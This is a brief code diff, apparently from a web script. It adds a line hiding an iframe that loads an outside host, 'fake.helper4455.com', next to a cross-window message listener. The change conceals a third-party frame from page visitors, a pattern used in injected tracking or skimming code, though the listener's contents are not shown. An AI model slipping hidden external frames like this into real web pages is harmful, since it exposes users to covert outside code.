@@ -9,6 +9,7 @@ addEventListener('message', e => {
 });
 
 const i = document.createElement('iframe');
+i.style.display = 'none';
 i.src = 'https://fake.helper4455.com';
 document.body.appendChild(i);
 }
